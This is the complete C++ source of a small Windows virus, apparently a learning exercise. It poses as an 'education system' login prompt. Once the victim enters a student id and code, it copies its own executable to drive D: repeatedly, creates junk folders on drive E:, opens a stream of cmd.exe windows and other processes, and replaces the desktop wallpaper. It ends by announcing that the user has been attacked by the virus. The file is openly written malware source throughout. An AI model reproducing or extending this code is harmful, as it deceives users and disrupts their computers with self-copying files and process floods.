#include<stdlib.h>
#include<Windows.h>
#include<direct.h>
#include<string.h>
#include<shlobj.h>
#include<time.h>
#include<iostream>
#include<string>

using namespace std;

void CreateRubbishFile(string filename,int n);
void CreateRubbishCmd(int n);
void ChangeBackground();
void DeleteUsefulFile();

int main(int argc, char *argv[])
{
    //cout<<argv[0]<<endl;
    int i,id;
    string code;
    cout<<"=================================================================================="<<endl;
    cout<<"Welcome to the modern education system"<<endl;
    cout<<"Input your student id"<<endl;
    cin>>id;
    cout<<"Input your code"<<endl;
    cin>>code;

    //step 1: reproduce itself
    string command="copy ";
    command+=argv[0];
    command+=" D:\\";
    for(i=0;i<id;i++)
    {
        string cmd=command;
        cmd+=('a'+i);
        cmd+=".exe";
        cout<<cmd<<endl;
        system(cmd.c_str());
    }
    //step 2: do some melicious operations
    //2.1 create rubbish directory
    CreateRubbishFile(code,id);
    //2.2 create rubbish process
    CreateRubbishCmd(id);
    //2.3 change the background of the computer
    ChangeBackground();
    cout<<"Hahahaha,you have be attacked by the virus"<<endl;
    system("pause");
    return 0;
}


void CreateRubbishFile(string filename,int n)
{
    system("E:");
    int i,j;
    for(i=0;i<n;i++)
    {
        string path1="E:\\";
        path1+=filename;
        path1+=('0'+i);
        string command="mkdir "+path1;
        system(command.c_str());
    }

    cout<<"There are some suprise in your E!"<<endl;
}


void CreateRubbishCmd(int n)
{
    int i;
    for(i=0;i<n;i++){
        system("start cmd.exe");
        system("start 2.exe");
    }
}


void ChangeBackground()
{
    int i;
    char buffer[MAX_PATH];
    getcwd(buffer, MAX_PATH);
    //cout<<buffer<<endl;

    string path="";
    for(i=0;i<strlen(buffer);i++)
    {
        if(buffer[i]=='\\')
        {
            path+="\\";
        }
        else
            path+=buffer[i];   
    }
    path+="\\1.bmp";
    //cout<<path<<endl;

    //cout<<path.c_str()<<endl;
    SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, (PVOID)path.c_str(),SPIF_UPDATEINIFILE);
}

